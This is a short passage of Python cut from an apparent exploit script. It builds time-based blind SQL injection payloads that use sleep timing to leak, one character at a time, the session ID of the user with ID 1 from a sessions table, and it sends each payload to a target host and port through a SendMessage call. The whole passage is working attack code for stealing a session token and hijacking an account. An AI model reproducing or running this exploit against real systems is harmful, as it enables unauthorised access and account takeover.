            before_query = datetime.now().timestamp()
            query = &quot;(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),%d,1))=%d) THEN sleep(%d) ELSE sleep(%d) END)&quot; % (i, ord(c), time_true, time_false)
            SendMessage(ip, port, sid, hostid, query)
